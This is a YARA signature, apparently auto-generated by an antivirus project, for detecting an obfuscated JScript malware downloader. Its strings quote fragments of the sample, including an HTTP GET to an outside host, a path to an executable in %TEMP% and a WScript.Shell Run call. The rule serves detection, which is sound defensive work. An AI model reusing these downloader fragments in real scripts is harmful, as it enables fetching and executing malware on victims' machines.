rule sig_20160328_41dac4e8159a4d7feb19f7508eff7312 {
  meta:
    description = "datamaliciousorder - file 20160328_41dac4e8159a4d7feb19f7508eff7312.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5dcd6370a77e75fa223a480d8854d1a94706406c02fcfb96a75c8ac8a11df8a2"

  strings:
    $s1  = "function Qulhvav() {return Dpmoihvh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"VKQw1Ybb4.exe\";};" fullword ascii
    $s2  = "Zvbbimhv[Akxtav](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Uohhfg](Hcepnolzlc() * 11)} while (Zvbbimhv[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Xbkofmqll(Jfsekfvkzl, Sbjzluyvi){return Jfsekfvkzl - Sbjzluyvi;};" fullword ascii
    $s5  = "var Dpmoihvh = function Ynnnnk() {return WScript[Tbuefukf](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Xwpdcskvz(Vjoyjdsy){Dpmoihvh[\"Run\"](Vjoyjdsy, Kgmpk, Kgmpk);};" fullword ascii
    $s7  = "function Pwjpdd() {return ((Mjoznnpvx == true) && (Mjoznnpvx == Yerbpruy)) ? 1 : Kgmpk;};" fullword ascii
    $s8  = "Mjoznnpvx = true; " fullword ascii
    $s9  = " while (Dosflmzo){" fullword ascii
    $s10 = "function Hcepnolzlc(){return 22;};" fullword ascii
    $s11 = "function Adorl(){return Nmgku;};" fullword ascii
    $s12 = "var Xffsqvwetd = new this[\"Date\"]();" fullword ascii
    $s13 = "function Jluwirwjhi(Xblfqb) {var Wahyzpnz = (1, 2, 3, 4, 5, Xblfqb); return Wahyzpnz;};" fullword ascii
    $s14 = "return Xbkofmqll(Igael, Ysjpzm);" fullword ascii
    $s15 = "var Mjoznnpvx = false;" fullword ascii
    $s16 = "function Jbvxywnhs()" fullword ascii
    $s17 = "var Oeralbb = false;" fullword ascii
    $s18 = "Yerbpruy = true; " fullword ascii
    $s19 = "function Agthcb(){return Tbuefukf;};" fullword ascii
    $s20 = "var Yerbpruy = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}